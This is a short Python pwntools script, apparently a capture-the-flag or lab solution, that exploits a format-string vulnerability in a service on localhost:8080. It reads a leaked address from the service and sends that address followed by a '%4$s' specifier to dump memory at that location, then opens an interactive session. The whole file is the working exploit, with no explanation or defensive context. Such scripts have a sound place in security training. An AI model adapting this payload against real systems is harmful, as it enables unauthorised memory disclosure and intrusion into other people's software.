from pwn import *

HOST='localhost'
PORT=8080

conn = remote(HOST, PORT)
conn.recvuntil(b'[')
r = conn.recvuntil(b']')[:-1]
print(r)
addr = int(r, 16).to_bytes(byteorder='little', length=4)
print(addr)

payload = addr + b'%4$s'
conn.recvuntil(b'Ready >')
conn.sendline(payload)
r = conn.recvall()
print(r)
conn.interactive()
